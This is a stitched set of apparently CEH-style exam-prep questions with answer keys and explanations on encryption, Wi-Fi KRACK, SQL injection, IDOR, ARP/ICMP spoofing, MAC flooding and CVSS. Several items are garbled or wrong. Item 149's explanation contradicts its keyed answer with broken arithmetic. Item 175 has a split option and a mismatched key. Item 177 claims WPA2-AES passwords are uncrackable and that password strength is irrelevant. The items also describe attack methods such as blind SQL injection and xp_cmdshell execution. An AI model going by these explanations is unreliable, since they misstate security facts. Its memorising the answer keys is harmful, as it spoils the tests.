produces a fixed-length output, called a hash or a digest, that uniquely represents the input. A digital signature is a hash of the email that is encrypted with the sender’s private key, using RSA. The digital signature is then attached to the email and sent to the recipient. When the recipient receives the email, they first decrypt the symmetric key with their private key, using RSA. They then use the symmetric key to decrypt the email content, using AES. They also verify the digital signature by decrypting it with the sender’s public key, using RSA, and comparing the resulting hash with the hash of the email, using the same hash function. If the hashes match, it means that the email is authentic and has not been tampered with. Using this technique, the email communication is secure because: The confidentiality of the email content is ensured by the symmetric encryption with AES, which is hard to break without knowing the symmetric key. The symmetric key is also protected by the asymmetric encryption with RSA, which is hard to break without knowing the recipient’s private key. The non-repudia..."}

This practice is also known as client-side encryption or end-to-end encryption, and it involves encrypting the data on the client’s device using a software or hardware tool that generates and manages the encryption keys. The encrypted data is then uploaded to the cloud service, where it remains encrypted at rest. The encryption keys are never shared with the cloud service provider or any third party, and they are only used by the client to decrypt the data when needed. This way, the client can maintain full control over the encryption keys and the security of the data, even when the data is stored on a public cloud service12. The other options are not as optimal as option D for the following reasons: A. Use the cloud service provider’s encryption services but store keys on-premises: This option is not feasible because it contradicts the client’s requirement of maintaining full control over the encryption keys. Using the cloud service provider’s encryption services means that the client has to rely on the cloud service provider to generate and manage the encryption keys, even if the keys are stored on- premises. The cloud service provider may have access to the keys or the ability to decrypt the data, which may compromise the security and privacy of the data. Moreover, storing the keys on-premises may introduce additional challenges, such as key distribution, synchronization, backup, and recovery3. B. Use the cloud service provider’s default encryption and key management services: This option is not desirable because it violates the client’s requirement of maintaining full control over the encryption keys. Using the cloud service provider’s default encryption and key management services means that the client has to trust the cloud service provider to encrypt and decrypt the data on the server-side, using the cloud service provider’s own encryption keys and mechanisms. The cloud service provider may have access to the keys or the ability to decrypt the data, which may compromise the security and privacy of the data. Furthermore, the cloud service provider’s default encryption and key management services may not meet the regulatory requirements or the security standards of the client4. C.

SSL encryption is a protocol that encrypts the data as it travels over the internet between the client and the server, using certificates and keys that are exchanged and verified by both parties. SSL encryption can protect the data from being intercepted or modified by unauthorized parties, but it does not protect the data from being accessed or decrypted by the cloud service provider or any third party who has access to the server.

This is achieved by manipulating and replaying cryptographic handshake messages. When the victim reinstall the key, associated parameters such as the incremental transmit packet number and receive packet number are reset to their initial values. What is this attack called?", "options": {"A": "Chop chop attack", "B": "KRACK", "C": "Evil twin", "D": "Wardriving"}, "answer": ["B"], "explanation": "In this attack KRACK is an acronym for Key Reinstallation Attack. KRACK may be a severe replay attack on Wi-Fi Protected Access protocol (WPA2), which secures your Wi-Fi connection. Hackers use KRACK to take advantage of a vulnerability in WPA2. When in close range of a possible victim, attackers can access and skim encrypted data using KRACK. How KRACK WorksYour Wi-Fi client uses a four-way handshake when attempting to attach to a protected network. The handshake confirms that both the client — your smartphone, laptop, et cetera — and therefore the access point share the right credentials, usually a password for the network. This establishes the Pairwise passkey (PMK), which allows for encoding .Overall, this handshake procedure allows for quick logins and connections and sets up a replacement encryption key with each connection. this is often what keeps data secure on Wi-Fi connections, and every one protected Wi-Fi connections use the four-way handshake for security. This protocol is that the reason users are encouraged to use private or credential-protected Wi-Fi instead of public connections.KRACK affects the third step of the handshake, allowing the attacker to control and replay the WPA2 encryption key to trick it into installing a key already in use. When the key’s reinstalled, other parameters related to it — the incremental transmit packet number called the nonce and therefore the replay counter — are set to their original values.Rather than move to the fourth step within the four-way handshake, nonce resets still replay transmissions of the third step. This sets up the encryption protocol for attack, and counting on how the attackers replay the third-step transmissions, they will take down Wi-Fi security. Why KRACK may be a ThreatThink of all the devices you employ that believe Wi-Fi. it isn’t almost laptops and smartphones; numerous smart devices now structure the web of Things (IoT). due to the vulnerability in WPA2, everything connected to Wi-Fi is in danger of being hacked or hijacked.Attackers using KRACK can gain access to usernames and passwords also as data stored on devices. Hackers can read emails and consider photos of transmitted data then use that information to blackmail users or sell it on the Dark Web.Theft of stored data requires more steps, like an HTTP content injection to load malware into the system. Hackers could conceivably take hold of any device used thereon Wi-Fi connection. Because the attacks require hackers to be on the brink of the target, these internet security threats could also cause physical security threats.On the opposite hand, the necessity to be in close proximity is that the only excellent news associated with KRACK, as meaning a widespread attack would be extremely difficult.Victims are specifically targeted.

Salts are used to safeguard passwords in storage. Historically a password was stored in plaintext on a system, but over time additional safeguards were developed to protect a user's password against being read from the system. A salt is one of those methods. A new salt is randomly generated for each password. In a typical setting, the salt and the password (or its version after key stretching) are concatenated and processed with a cryptographic hash function, and the output hash value (but not the original password) is stored with the salt in a database. Hashing allows for later authentication without keeping and therefore risking exposure of the plaintext password in the event that the authentication data store is compromised. Salts defend against a pre-computed hash attack, e.g. rainbow tables. Since salts do not have to be memorized by humans they can make the size of the hash table required for a successful attack prohibitively large without placing a burden on the users. Since salts are different in each case, they also protect commonly used passwords, or those users who use the same password on several sites, by making all salted hash instances for the same password different from each other."}

This sequence of actions works as follows: Use Hping3 for an ICMP ping scan on the entire subnet: This action is used to discover the active hosts on the network by sending ICMP echo request packets to each possible IP address on the subnet and waiting for ICMP echo reply packets from the hosts. Hping3 is a command-line tool that can craft and send custom packets, such as TCP, UDP, or ICMP, and analyze the responses. By using Hping3 for an ICMP ping scan, the hacker can quickly and efficiently identify the live hosts on the network, as well as their response times and packet loss rates12. Use Nmap for a SYN scan on identified active hosts: This action is used to scan the open ports and services on the active hosts by sending TCP SYN packets to a range of ports and analyzing the TCP responses. Nmap is a popular and powerful tool that can perform various types of network scans, such as port scanning, service detection, OS detection, and vulnerability scanning. By using Nmap for a SYN scan, the hacker can determine the state of the ports on the active hosts, such as open, closed, filtered, or unfiltered, as well as the services and protocols running on them. A SYN scan is also known as a stealth scan, as it does not complete the TCP three-way handshake and thus avoids logging on the target system34. Use Metasploit to exploit identified vulnerabilities: This action is used to exploit the vulnerabilities on the active hosts by using pre-built or custom modules that leverage the open ports and services. Metasploit is a framework that contains a collection of tools and modules for penetration testing and exploitation. By using Metasploit, the hacker can launch various attacks on the active hosts, such as remote code execution, privilege escalation, or backdoor installation, and gain access to the target system or data.

A false negative is the opposite of a false positive, telling you that you don't have a vulnerability when, in fact, you do. A false positive is like a false alarm; your house alarm goes off, but there is no burglar. In web application security, a false positive is when a web application security scanner indicates that there is a vulnerability on your website, such as SQL Injection, when, in reality, there is not. Web security experts and penetration testers use automated web application security scanners to ease the penetration testing process. These tools help them ensure that all web application attack surfaces are correctly tested in a reasonable amount of time. But many false positives tend to break down this process. If the first 20 variants are false, the penetration tester assumes that all the others are false positives and ignore the rest. By doing so, there is a good chance that real web application vulnerabilities will be left undetected. When checking for false positives, you want to ensure that they are indeed false. By nature, we humans tend to start ignoring false positives rather quickly. For example, suppose a web application security scanner detects 100 SQL Injection vulnerabilities. If the first 20 variants are false positives, the penetration tester assumes that all the others are false positives and ignore all the rest. By doing so, there are chances that real web application vulnerabilities are left undetected. This is why it is crucial to check every vulnerability and deal with each false positive separately to ensure false positives."}

Rob substitutes Ned's name in the \"name\" parameter and if the developer has not fixed this vulnerability, then Rob will gain access to Ned's account. Below you will find more detailed information about IDOR vulnerability. Insecure direct object references (IDOR) are a cybersecurity issue that occurs when a web application developer uses an identifier for direct access to an internal implementation object but provides no additional access control and/or authorization checks. For example, an IDOR vulnerability would happen if the URL of a transaction could be changed through client-side user input to show unauthorized data of another transaction. Most web applications use simple IDs to reference objects. For example, a user in a database will usually be referred to via the user ID. The same user ID is the primary key to the database column containing user information and is generated automatically. The database key generation algorithm is very simple: it usually uses the next available integer. The same database ID generation mechanisms are used for all other types of database records. The approach described above is legitimate but not recommended because it could enable the attacker to enumerate all users. If it’s necessary to maintain this approach, the developer must at least make absolutely sure that more than just a reference is needed to access resources. For example, let’s say that the web application displays transaction details using the following URL: https://www.example.com/transaction.php?id=74656 A malicious hacker could try to substitute the parameter value 74656 with other similar values, for example: id https://www.example.com/transaction.php?id=74657 The 74657 transaction could be a valid transaction belonging to another user. The malicious hacker should not be authorized to see it. However, if the developer made an error, the attacker would see this transaction and hence we would have an insecure direct object reference vulnerability."}

This includes the operating system, the web server software, the database software, and any other applications or frameworks that run on the server. Updating and patching the server software can fix known vulnerabilities, bugs, or errors that could be exploited by attackers to compromise the server or the website. Failing to update and patch the server software can expose the server to common attacks, such as SQL injection, cross-site scripting, remote code execution, denial-of-service, etc. Installing a web application firewall, limiting the number of concurrent connections to the server, and encrypting the company’s website with SSL/TLS are also good practices to secure a web server, but they are not as critical as updating and patching the server software. A web application firewall can filter and block malicious requests, but it cannot prevent attacks that exploit unpatched vulnerabilities in the server software. Limiting the number of concurrent connections to the server can prevent overload and improve performance, but it cannot stop attackers from sending malicious requests or payloads. Encrypting the company’s website with SSL/TLS can protect the data in transit between the server and the client, but it cannot protect the data at rest on the server or prevent attacks that target the server itself. Therefore, the priority action to secure a web server from common threats is to regularly update and patch the server software.

This technique is primarily used to reroute the packets and intercept or modify the data exchanged between the client and the server. A man-in-the-middle attack using forged ICMP and ARP spoofing works as follows1: The attacker sends a forged ICMP redirect message to the client, claiming to be the gateway. The ICMP redirect message tells the client to use the attacker’s machine as the next hop for reaching the server’s network. The client updates its routing table accordingly and starts sending packets to the attacker’s machine instead of the gateway. The attacker also sends a forged ARP reply message to the client, claiming to be the server. The ARP reply message associates the attacker’s MAC address with the server’s IP address. The client updates its ARP cache accordingly and starts sending packets to the attacker’s MAC address instead of the server’s MAC address. The attacker receives the packets from the client and forwards them to the server, acting as a relay. The attacker can also monitor, modify, or drop the packets as they wish. The server responds to the packets and sends them back to the attacker, who then forwards them to the client. The client and the server are unaware of the attacker’s presence and think they are communicating directly with each other. Therefore, Jake is studying a man-in-the-middle attack using forged ICMP and ARP spoofing, which is a type of network-level session hijacking attack.

A Continual/Adaptive Security Strategy aims to proactively identify and mitigate emerging threats, vulnerabilities, and risks, as well as to respond effectively and efficiently to security incidents and breaches. A Continual/Adaptive Security Strategy can help enhance the organization’s security stance by providing the following benefits12: It can reduce the attack surface and the exposure time of the organization’s network infrastructure, by applying timely patches, updates, and configurations, as well as by implementing security controls and policies. It can increase the visibility and awareness of the organization’s network activity and behavior, by collecting, analyzing, and correlating data from various sources, such as logs, sensors, alerts, and reports. It can improve the detection and prevention capabilities of the organization, by using advanced tools and techniques, such as artificial intelligence, machine learning, threat intelligence, and behavioral analytics, to identify and block malicious or anomalous patterns and indicators. It can enhance the response and recovery processes of the organization, by using automated and orchestrated actions, such as isolation, quarantine, remediation, and restoration, to contain and resolve security incidents and breaches, as well as by conducting lessons learned and root cause analysis to prevent recurrence.

Option C has ‘f=505’, which is less than ‘s’ by 5 packets per second, so the response time increases but not as drastically (245 = 32 times the normal response time), and the system might still function, albeit slowly.

{"id": 149, "topic": 3, "question": "In an intricate web application architecture using an Oracle database, you, as a security analyst, have identified a potential SQL Injection attack surface. The database consists of 'x' tables, each with 'y' columns. Each table contains 'z' records. An attacker, well-versed in SQLi techniques, crafts 'u' SQL payloads, each attempting to extract maximum data from the database. The payloads include UNION SELECT statements and DBMS_XSLPROCESSOR.READ2CLOB to read sensitive files. The attacker aims to maximize the total data extracted E=x*y*z*u. Assuming x=4, y=2, and varying 'z' and 'u', which situation is likely to result in the highest extracted data volume?", "options": {"A": "z=400, u=4: The attacker constructs 4 SQL payloads, each focusing on tables with 400 records (E=12800)", "B": "z=550, u=2: The attacker formulates 2 SQL payloads and directs them towards tables containing 550 records (E=8800)", "C": "z=600, u=2: The attacker devises 2 SQL payloads, each aimed at tables holding 600 records (E=9600)", "D": "z=500, u=3: The attacker creates 3 SQL payloads and targets tables with 500 records each (E=12000)"}, "answer": ["A"], "explanation": "The total data extracted by the attacker is E=xyz’u’, where x is the number of tables, y is the number of columns, z is the number of records, and u is the number of SQL payloads. To maximize E, the attacker would want to choose the highest values of z and u, while keeping x and y constant. Therefore, the situation where z=600 and u=2 would result in the highest extracted data volume, as E=42600*2=9600. The other situations would result in lower values of E, as shown below: A: E=42400*4=12800 B: E=42550*2=8800 D: E=42500*3=12000 The attacker uses UNION SELECT statements to combine the results from different tables and columns, and DBMS_XSLPPOCESSOR.READ2CLOB to read sensitive files from the database server12.

CVSS is a framework that numerically characterizes the severity of software vulnerabilities between the range of 0-10. CVSS consists of three metric groups: Base, Temporal, and Environmental. The base metric group captures the characteristics of a vulnerability that are constant over time and across user environments. The base metric group consists of six sub-metrics: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and Impact. The impact sub-metric further consists of three sub-metrics: Confidentiality, Integrity, and Availability. The base metric group produces a score ranging from 0 to 10, which reflects the intrinsic and fundamental properties of a vulnerability12. The other options are not correct for the following reasons: A. Temporal metric represents the inherent qualities of a vulnerability: This option is incorrect because the temporal metric group captures the characteristics of a vulnerability that change over time due to events external to the vulnerability. The temporal metric group consists of three sub-metrics: Exploit Code Maturity, Remediation Level, and Report Confidence. The temporal metric group modifies the base score to reflect the current state of the vulnerability, such as the availability of exploit code, the existence of patches or workarounds, and the degree of verification of the vulnerability report12. C. Environmental metric involves the features that change during the lifetime of the vulnerability: This option is incorrect because the environmental metric group captures the characteristics of a vulnerability that are relevant and unique to a user’s environment. The environmental metric group consists of three sub-metrics: Modified Attack Vector, Modified Attack Complexity, and Modified Privileges Required. The environmental metric group also allows the user to assign importance values to the impact sub-metrics: Confidentiality Requirement, Integrity Requirement, and Availability Requirement. The environmental metric group modifies the base and temporal scores to reflect the impact of the vulnerability on the user’s specific environment, such as the network configuration, the security objectives, and the asset value12. D. Temporal metric involves measuring vulnerabilities based on a specific environment or implementation: This option is incorrect because the temporal metric group does not involve measuring vulnerabilities based on a specific environment or implementation, but rather on the factors that change over time due to events external to the vulnerability.

A blind injection technique is a type of SQL injection technique that is used when the web application does not return any detailed error messages or data from the database, but only indicates whether the query was executed successfully or not. A blind injection technique relies on sending specially crafted SQL queries that cause a noticeable change in the behavior or response of the web application, such as a time delay or an error signature, which can then be used to infer information about the database. For example, the hacker could use the following methods12: Time-based blind injection: This method involves injecting a SQL query that contains a time delay function, such as SLEEP() or WAITFOR DELAY, which pauses the execution of the query for a specified amount of time. The hacker can then measure the time difference between the normal and the delayed responses, and use it to determine whether the injected query was true or false. By using this method, the hacker can perform a binary search to guess the values of the data in the database, one bit at a time. Error-based blind injection: This method involves injecting a SQL query that contains a deliberate error, such as a division by zero, a type mismatch, or an invalid conversion, which causes the database to generate an error message. The hacker can then analyze the error message, which may contain useful information about the database, such as the version, the name, the structure, or the data. By using this method, the hacker can exploit the error handling mechanism of the database to extract information. The other options are not as suitable as option D for the following reasons: A. Use the UNION operator to combine the result sets of two or more SELECT statements: This option is not feasible because it requires the web application to return data from the database, which is not the case in this scenario. The UNION operator is a SQL operator that allows the hacker to append the results of another SELECT statement to the original query, and display them as part of the web page. This way, the hacker can retrieve data from other tables or columns that are not intended to be shown by the web application. However, this option does not work when the web application does not return any data or error messages from the database, as in this scenario3. B. Attempt to compromise the system through OS-level command shell execution: This option is not relevant because it is not a SQL injection technique, but a post-exploitation technique. OS-level command shell execution is a method of gaining access to the underlying operating system of the web server, by injecting a SQL query that contains a system command, such as xp_cmdshell, exec, or shell_exec, which executes the command on the server. ..."}

The classification is based on heuristics or rules, rather than patterns or signatures, and attempts to detect any type of misuse that falls out of normal system operation. This is as opposed to signature-based systems, which can only detect attacks for which a signature has previously been created. In order to positively identify attack traffic, the system must be taught to recognize normal system activity. The two phases of a majority of anomaly detection systems consist of the training phase (where a profile of normal behaviors is built) and the testing phase (where current traffic is compared with the profile created in the training phase). Anomalies are detected in several ways, most often with artificial intelligence type techniques. Systems using artificial neural networks have been used to great effect. Another method is to define what normal usage of the system comprises using a strict mathematical model, and flag any deviation from this as an attack. This is known as strict anomaly detection.[3] Other techniques used to detect anomalies include data mining methods, grammar-based methods, and the Artificial Immune System. Network-based anomalous intrusion detection systems often provide a second line of defense to detect anomalous traffic at the physical and network layers after it has passed through a firewall or other security appliance on the border of a network. Host-based anomalous intrusion detection systems are one of the last layers of defense and reside on computer endpoints. They allow for fine-tuned, granular protection of endpoints at the application level. Anomaly-based Intrusion Detection at both the network and host levels have a few shortcomings; namely a high false-positive rate and the ability to be fooled by a correctly delivered attack. Attempts have been made to address these issues through techniques used by PAYL and MCPAD."}

{"id": 175, "topic": 3, "question": "A Certified Ethical Hacker (CEH) is given the task to perform an LDAP enumeration on a target system. The system is secured and accepts connections only on secure LDAP. The CEH uses Python for the enumeration process. After successfully installing LDAP and establishing a connection with the target, he attempts to fetch details like the domain name and naming context but is unable to receive the expected response. Considering the circumstances, which of the following is the most plausible reason for this situation?", "options": {"A": "The Python version installed on the CEH's machine is incompatible with the Idap3 library", "B": "The secure LDAP connection was not properly initialized due to a lack of 'use_ssl = True' in the server", "C": "object creation", "D": "The enumeration process was blocked by the target system's intrusion detection system", "E": "The system failed to establish a connection due to an incorrect port number"}, "answer": ["B", "E"], "explanation": "The most plausible reason for the situation is that the secure LDAP connection was not properly initialized due to a lack of ‘use_ssl = True’ in the server object creation. To use secure LDAP (LDAPS), the CEH needs to specify the use_ssl parameter as True when creating the server object with the ldap3 library in Python. This parameter tells the library to use SSL/TLS encryption for the LDAP communication. If the parameter is omitted or set to False, the library will use plain LDAP, which may not be accepted by the target system that only allows secure LDAP connections12. For example, the CEH can use the following code to create a secure LDAP server object: from ldap3 import Server, Connection, ALL server = Server('ldaps://<target_ip>', use_ssl=True, get_info=ALL) connection = Connection(server, user='<username>', password='<password>') connection.bind() The other options are not as plausible as option B for the following reasons: A. The Python version installed on the CEH’s machine is incompatible with the ldap3 library: This option is unlikely because the ldap3 library supports Python versions from 2.6 to 3.9, which covers most of the commonly used Python versions3. Moreover, if the Python version was incompatible, the CEH would not be able to install the library or import it in the code, and would encounter errors before establishing the connection. C. The enumeration process was blocked by the target system’s intrusion detection system: This option is possible but not very plausible because the CEH was able to establish a connection with the target, which means the intrusion detection system did not block the initial handshake. Moreover, the enumeration process would not affect the response of the target system, but rather the visibility of the results. If the intrusion detection system detected and blocked the enumeration, the CEH would receive an error message or a blank response, not an unexpected response. D. The system failed to establish a connection due to an incorrect port number: This option is incorrect because the CEH was able to establish a connection with the target, which means the port number was correct. If the port number was incorrect, the CEH would not be able to connect to the target system at all, and would receive a connection refused error.

{"id": 177, "topic": 3, "question": "As a budding cybersecurity enthusiast, you have set up a small lab at home to learn more about wireless network security. While experimenting with your home Wi-Fi network, you decide to use a well-known hacking tool to capture network traffic and attempt to crack the Wi-Fi password. However, despite many attempts, you have been unsuccessful. Your home Wi-Fi network uses WPA2 Personal with AES encryption. Why are you finding it difficult to crack the Wi-Fi password?", "options": {"A": "The Wi-Fi password is too complex and long", "B": "Your hacking tool is outdated", "C": "The network is using an uncrackable encryption method", "D": "The network is using MAC address filtering."}, "answer": ["C"], "explanation": "The network is using an uncrackable encryption method, which makes it difficult to crack the Wi-Fi password. WPA2 Personal with AES encryption is the strongest form of security offered by Wi-Fi devices at the moment, and it should be used for all purposes. AES stands for Advanced Encryption Standard, and it is a symmetric-key algorithm that uses a 128-bit, 192-bit, or 256-bit key to encrypt and decrypt data. AES is considered to be uncrackable by brute force attacks, as it would take an impractical amount of time and computational power to try all possible key combinations12. Therefore, unless you have access to the Wi-Fi password or the encryption key, you will not be able to decrypt the network traffic and crack the password. The other options are not correct for the following reasons: A. The Wi-Fi password is too complex and long: This option is not relevant because the Wi-Fi password is not directly used to encrypt the network traffic. Instead, the password is used to generate a Pre-Shared Key (PSK), which is then used to derive a Pairwise Master Key (PMK), which is then used to derive a Pairwise Transient Key (PTK), which is then used to encrypt the data. Therefore, the complexity and length of the password do not affect the encryption strength, as long as the password is not easily guessed or leaked34. B. Your hacking tool is outdated: This option is not plausible because even if your hacking tool is outdated, it would not affect your ability to capture the network traffic and attempt to crack the password. The hacking tool may not support the latest Wi-Fi standards or protocols, but it should still be able to capture the raw data packets and save them in a file. The cracking process would depend on the encryption algorithm and the key, not on the hacking tool. D. The network is using MAC address filtering: This option is not feasible because MAC address filtering is a technique that restricts network access and communication to trusted devices based on their MAC addresses, which are unique identifiers assigned to network interfaces. MAC address filtering can prevent unauthorized devices from joining the network, but it cannot prevent authorized devices from capturing the network traffic. Moreover, MAC address filtering can be easily bypassed by spoofing the MAC address of an allowed device56.

{"id": 181, "topic": 3, "question": "Your company, Encryptor Corp, is developing a new application that will handle highly sensitive user information. As a cybersecurity specialist, you want to ensure this data is securely stored. The development team proposes a method where data is hashed and then encrypted before storage. However, you want an added layer of security to verify the integrity of the data upon retrieval. Which of the following cryptographic concepts should you propose to the team?", "options": {"A": "Implement a block cipher mode of operation.", "B": "a digital signature mechanism.", "C": "Suggest using salt with hashing.", "D": "Switch to elliptic curve cryptography."}, "answer": ["B"], "explanation": "A digital signature mechanism is a cryptographic concept that you should propose to the team to verify the integrity of the data upon retrieval. A digital signature mechanism works as follows: A digital signature is a mathematical scheme that allows the sender of a message to sign the message with their private key, and allows the receiver of the message to verify the signature with the sender’s public key. A digital signature provides two security services: authentication and non- repudiation. Authentication means that the receiver can confirm the identity of the sender, and non- repudiation means that the sender cannot deny sending the message12. A digital signature mechanism consists of three algorithms: key generation, signing, and verification. Key generation produces a pair of keys: a private key for the sender and a public key for the receiver. Signing takes the message and the private key as inputs, and outputs a signature. Verification takes the message, the signature, and the public key as inputs, and outputs a boolean value indicating whether the signature is valid or not12. A digital signature mechanism can be implemented using various cryptographic techniques, such as hash-based signatures, RSA signatures, or elliptic curve signatures. A common method is to use a hash function to compress the message into a fixed-length digest, and then use an asymmetric encryption algorithm to encrypt the digest with the private key. The encrypted digest is the signature, which can be decrypted with the public key and compared with the hash of the message to verify the integrity12. A digital signature mechanism can ensure the integrity of the data upon retrieval, because: A digital signature is unique to the message and the sender, and it cannot be forged or altered by anyone else. If the message or the signature is modified in any way, the verification will fail and the receiver will know that the data is corrupted or tampered with12. A digital signature is independent of the encryption or hashing of the data, and it can be applied to any type of data, regardless of its format or size. The encryption or hashing of the data can provide confidentiality and efficiency, but they cannot provide integrity or authentication by themselves. A digital signature can complement the encryption or hashing of the data by providing an additional layer of security12. The other options are not as suitable as option B for the following reasons: A. Implement a block cipher mode of operation: This option is not relevant because it does not address the integrity verification issue, but the encryption issue. A block cipher mode of operation is a method of applying a block cipher, which is a symmetric encryption algorithm that operates on fixed-length blocks of data, to a variable-length message. A block cipher mode of operation can provide different security properties, such as confidentiality, integrity, or authenticity, depending on the mode. However, a block cipher mo..."}

Your company is developing a new cloud storage platform where users can store their personal files. To ensure data security, the development team is proposing to use symmetric encryption for data at rest. However, they are unsure of how to securely manage and distribute the symmetric keys to users. Which of the following strategies would you recommend to them?", "options": {"A": "Use hash functions to distribute the keys.", "B": "implement the Diffie-Hellman protocol for secure key exchange.", "C": "Use HTTPS protocol for secure key transfer.", "D": "Use digital signatures to encrypt the symmetric keys."}, "answer": ["C"], "explanation": "Symmetric encryption is a method of encrypting and decrypting data using the same secret key. Symmetric encryption is fast and efficient, but it requires a secure way of managing and distributing the keys to the users who need them. If the keys are compromised, the data is no longer secure. One of the strategies to securely manage and distribute symmetric keys is to use HTTPS protocol for secure key transfer. HTTPS is a protocol that uses SSL/TLS to encrypt the communication between a client and a server over the Internet. HTTPS can protect the symmetric keys from being intercepted or modified by an attacker during the key transfer process. HTTPS can also authenticate the server and the client using certificates, ensuring that the keys are sent to and received by the intended parties. To use HTTPS protocol for secure key transfer, the development team needs to implement the following steps1: Generate a symmetric key for each user who wants to store their files on the cloud storage platform. The symmetric key will be used to encrypt and decrypt the user’s files. Generate a certificate for the cloud storage server. The certificate will contain the server’s public key and other information, such as the server’s domain name, the issuer, and the validity period. The certificate will be signed by a trusted certificate authority (CA), which is a third-party entity that verifies the identity and legitimacy of the server. Install the certificate on the cloud storage server and configure the server to use HTTPS protocol for communication. When a user wants to upload or download their files, the user’s client (such as a web browser or an app) will initiate a HTTPS connection with the cloud storage server. The client will verify the server’s certificate and establish a secure session with the server using SSL/TLS. The client and the server will negotiate a session key, which is a temporary symmetric key that will be used to encrypt the data exchanged during the session. The cloud storage server will send the user’s symmetric key to the user’s client, encrypted with the session key. The user’s client will decrypt the symmetric key with the session key and use it to encrypt or decrypt the user’s files. The user’s client will store the symmetric key securely on the user’s device, such as in a password- protected file or a hardware token. The user’s client will also delete the session key after the session is over. Using HTTPS protocol for secure key transfer can ensure that the symmetric keys are protected from eavesdropping, tampering, or spoofing attacks. However, this strategy also has some challenges and limitations, such as: The development team needs to obtain and maintain valid certificates for the cloud storage server from a trusted CA, which might incur costs and administrative overhead. The users need to trust the CA that issued the certificates for the cloud storage server and verify the certificates before accepting them. The users need to protect t..."}

In a switched Ethernet environment, where each port on a switch is connected to a single device, a sniffer tool can only see the traffic that is destined for or originated from the device it is attached to. However, an attacker can use various techniques to overcome this limitation and sniff the traffic of other devices on the same network. One of these techniques is MAC flooding, which exploits the finite memory of the switch’s MAC address table. The attacker sends a large number of frames with different source MAC addresses to the switch, which fills up the MAC address table and causes the switch to enter a fail-open mode, where it broadcasts all incoming frames to all ports, regardless of the destination MAC address. This way, the attacker can see all the traffic on the network and capture it with a sniffer tool. The other options are less likely or less effective techniques for sniffing a switched Ethernet network. Compromising physical security to plug into the network directly may allow the attacker to sniff the traffic of the device they are connected to, but not the traffic of other devices on the network. Using a Trojan horse with in-built sniffing capability may allow the attacker to sniff the traffic of the infected device, but not the traffic of other devices on the network, unless the Trojan horse also performs MAC flooding or other techniques to bypass the switch. Using passive sniffing, which involves listening to the network traffic without sending any packets, may provide significant stealth advantages, but it does not help the attacker to see the traffic of other devices on the network, unless the switch is already in fail-open mode or the attacker uses other techniques to induce it.

Encryption is a process of transforming data into an unreadable format using a secret key or algorithm. Only authorized parties who have the correct key or algorithm can decrypt and access the data. Encryption can be applied to data at rest, such as files or databases, or data in transit, such as network traffic or messages. Encryption can prevent attackers from stealing or tampering with the customer data stored on the device, such as credit card details and PINs, which can cause financial or identity fraud. The other options are not as effective or sufficient as encryption for securing the customer data stored on the device. Implementing biometric authentication for app access may provide an additional layer of security, but it does not protect the data from being accessed by other means, such as malware, physical access, or backup extraction. Enabling GPS tracking for all devices using the app may help locate the device in case of loss or theft, but it does not prevent the data from being accessed by unauthorized parties, and it may also pose privacy risks. Regularly updating the app to the latest version may help fix bugs or vulnerabilities, but it does not guarantee the security of the data, especially if the app does not use encryption or other security features.

CVSS consists of three metric groups: Base, Temporal, and Environmental. The Base metrics produce a score ranging from 0 to 10, which can then be modified by scoring the Temporal and Environmental metrics. A vector string represents the values of all the metrics as a block of text1 The Base metrics measure the intrinsic characteristics of a vulnerability, such as the attack vector, the attack complexity, the required privileges, the user interaction, the scope, and the impact on confidentiality, integrity, and availability. The Base score reflects the severity of a vulnerability assuming that there is no temporal information or context available1 The Temporal metrics measure the characteristics of a vulnerability that change over time, such as the exploit code maturity, the remediation level, and the report confidence. The Temporal score reflects the current state of a vulnerability and its likelihood of being exploited1 The Environmental metrics measure the characteristics of a vulnerability that depend on a specific implementation or environment, such as the security requirements, the modified base metrics, and the collateral damage potential. The Environmental score reflects the impact of a vulnerability on a particular organization or system1 In this scenario, the vulnerability has a Base score of 7, a Temporal score of 8, and an Environmental score of 5. This means that: The vulnerability has a high severity based on its intrinsic characteristics, such as the attack vector, the attack complexity, the required privileges, the user interaction, the scope, and the impact on confidentiality, integrity, and availability. A Base score of 7 corresponds to a high severity rating according to the CVSS v3.0 specification1 The vulnerability has an increasing likelihood of exploitability over time based on its current state, such as the exploit code maturity, the remediation level, and the report confidence. A Temporal score of 8 is higher than the Base score of 7, which indicates that the vulnerability is more likely to be exploited as time passes1 The vulnerability has a medium impact on the specific environment or implementation based on the security requirements, the modified base metrics, and the collateral damage potential. An Environmental score of 5 is lower than the Base score of 7, which indicates that the vulnerability is less impactful in the particular context of the organization or system1 Therefore, the statement that best describes this scenario is: The vulnerability has an overall high severity, the likelihood of exploitability is increasing over time, and it has a medium impact in their specific environment.

RADIUS is a client/server protocol that runs in the application layer, and can use either TCP or UDP. Network access servers, which control access to a network, usually contain a RADIUS client component that communicates with the RADIUS server. RADIUS is often the back-end of choice for 802.1X authentication. A RADIUS server is usually a background process running on UNIX or Microsoft Windows. Authentication and authorization The user or machine sends a request to a Network Access Server (NAS) to gain access to a particular network resource using access credentials. The credentials are passed to the NAS device via the link-layer protocol— for example, Point-to-Point Protocol (PPP) in the case of many dialup or DSL providers or posted in an HTTPS secure web form. In turn, the NAS sends a RADIUS Access Request message to the RADIUS server, requesting authorization to grant access via the RADIUS protocol. This request includes access credentials, typically in the form of username and password or security certificate provided by the user. Additionally, the request may contain other information which the NAS knows about the user, such as its network address or phone number, and information regarding the user's physical point of attachment to the NAS. The RADIUS server checks that the information is correct using authentication schemes such as PAP, CHAP or EAP. The user's proof of identification is verified, along with, optionally, other information related to the request, such as the user's network address or phone number, account status, and specific network service access privileges. Historically, RADIUS servers checked the user's information against a locally stored flat- file database. Modern RADIUS servers can do this or can refer to external sources—commonly SQL, Kerberos, LDAP, or Active Directory servers—to verify the user's credentials. Shape Description automatically generated with medium confidence The RADIUS server then returns one of three responses to the NAS: 1) Access-Reject, 2) Access-Challenge, 3) Access-Accept. Access-Reject The user is unconditionally denied access to all requested network resources. Reasons may include failure to provide proof of identification or an unknown or inactive user account. Access-Challenge Requests additional information from the user such as a secondary password, PIN, token, or card. Access- Challenge is also used in more complex authentication dialogs where a secure tunnel is established between the user machine and the Radius Server in a way that the access credentials are hidden from the NAS. Access-Accept The user is granted access. Once the user is authenticated, the RADIUS server will often check that the user is authorized to use the network servic..."}

